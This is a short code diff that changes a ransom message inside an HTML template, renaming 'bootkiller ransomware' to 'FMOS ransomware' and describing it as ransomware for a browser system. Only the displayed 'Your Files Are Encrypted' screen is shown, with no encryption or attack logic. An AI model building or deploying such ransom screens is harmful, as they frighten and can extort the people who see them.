@@ -32,7 +32,7 @@ let newHtml = `
       <div class="container">
         <h1 class="header">Your Files Are Encrypted</h1>
         <p class="message">
-          All your files have been killed by the bootkiller ransomware<br>
+          All your files have been killed by the FMOS ransomware<br>
           this is a ransomware for the browser od FMOS<br>
         </p>
         <p class="message">
